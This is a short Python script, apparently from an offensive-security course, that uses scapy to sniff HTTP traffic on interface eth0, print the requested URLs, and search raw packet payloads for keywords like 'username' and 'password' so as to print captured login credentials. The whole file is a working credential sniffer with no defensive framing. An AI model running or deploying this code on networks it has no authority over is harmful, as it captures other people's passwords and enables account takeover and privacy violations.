#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    # To get urls (only http)
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    # Printing username and passwords
    # As username and passwords are stored in RAW packet, seen that using packet.show()
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "uname", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in str(load):
                return load


def process_sniffed_packet(packet):
    # Analyzing/Filtering only http layers
    if packet.haslayer(http.HTTPRequest):

        # Getting urls
        url = get_url(packet)
        print(f"[+] HTTP Request >> {url}")

        # Getting login info
        login_info = get_login_info(packet)
        if login_info:
            print(f"\n\n[+] Possible username/password > {login_info}\n\n")


sniff("eth0")
